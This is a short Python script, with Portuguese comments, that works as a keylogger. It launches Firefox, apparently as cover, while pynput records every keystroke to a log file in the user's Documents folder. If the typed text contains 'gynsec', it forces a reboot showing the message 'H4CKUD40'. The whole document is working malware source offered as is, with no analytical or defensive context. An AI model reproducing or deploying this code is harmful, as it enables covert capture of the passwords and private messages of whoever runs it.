# -*- coding: utf-8 -*-
from pynput.keyboard import Listener
import os, subprocess

## Programa que será aberto ao chamar o script
subprocess.Popen(["firefox.exe"])

user_path = os.environ['USERPROFILE']
logFile = "%s\Documents\logfile.txt" % user_path

f = open(logFile, "w+")
f.write("--KeyLogger--\n\n")
f.close()

def writeLog(key):
    try:
        key_str = str(key)
        key_str =  key_str.split("'")
        #print key_str[1]
        keydata = key_str[1]
    except:
        keydata = str(key)
    
    translate_keys = {
        "Key.space": " ",
        "Key.shift_r": "[Shift_R]",
        "Key.shift_l": "[Shift_L]",
        "Key.enter": "\n",
        "Key.alt": "[ALT]",
        "Key.esc": "[ESC]",
        "Key.cmd": "[CMD]",
        "Key.caps_lock": "[CAPS_Lock]",
        "Key.delete": "[DELETE]",
        "Key.backspace": "[BACKSPACE]",
    }

    for key in translate_keys:
        keydata = keydata.replace(key, translate_keys[key])

    with open(logFile, "a") as f:
        f.write(str(keydata))

    f = open(logFile, "r")
    if "gynsec" in f.read():
        os.system('shutdown -r -t 5 -c "H4CKUD40"')

with Listener(on_press=writeLog) as l:
    l.join()
